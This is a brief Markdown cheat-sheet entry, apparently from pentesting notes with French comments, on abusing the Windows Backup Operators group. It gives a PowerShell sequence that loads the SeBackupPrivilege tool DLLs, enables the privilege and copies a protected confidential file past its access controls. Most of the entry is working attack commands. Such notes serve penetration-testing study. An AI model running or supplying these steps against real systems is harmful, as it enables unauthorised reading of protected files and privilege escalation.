
## Windows Built-in Groups 
### Backup Operators
ref : https://github.com/giuliano108/SeBackupPrivilege

```powershell 
#### Importer des bibliothèques
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

#### Vérification que SeBackupPrivilege est activé
whoami /priv
Get-SeBackupPrivilege

#### Activation du privilège SeBackup
Set-SeBackupPrivilege
Get-SeBackupPrivilege
whoami /priv

#### Copie d'un fichier protégé
dir C:\Confidential\
cat 'C:\Confidential\2021 Contract.txt' 
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
cat .\Contract.txt
```
